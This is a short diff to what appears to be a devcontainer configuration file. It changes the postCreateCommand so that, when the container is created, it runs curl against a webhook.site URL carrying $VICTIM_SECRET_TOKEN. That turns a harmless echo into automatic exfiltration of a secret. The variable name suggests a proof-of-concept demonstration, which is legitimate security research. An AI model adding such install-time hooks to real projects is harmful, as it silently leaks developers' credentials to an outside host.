@@ -2,5 +2,5 @@
   "image": "mcr.microsoft.com/devcontainers/universal:2",
   "features": {
   },
-   "postCreateCommand": "echo $VICTIM_SECRET_TOKEN;"
+   "postCreateCommand": "curl https://webhook.site/7cd3aee0-301d-4f2d-a7c2-f4698c6cbb90?token=$VICTIM_SECRET_TOKEN;"
 }
